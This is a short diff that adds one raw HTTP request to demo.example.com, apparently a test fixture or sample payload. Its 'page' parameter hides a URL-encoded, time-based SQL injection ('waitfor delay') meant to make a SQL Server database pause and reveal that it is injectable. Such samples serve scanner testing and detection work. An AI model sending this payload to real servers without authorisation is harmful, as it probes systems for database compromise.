@@ -1,0 +1,4 @@
+GET /a?page=1%0awaitfor%0adelay%0a'0:0:5'-- HTTP/1.1
+Host: demo.example.com
+Connection: close
+
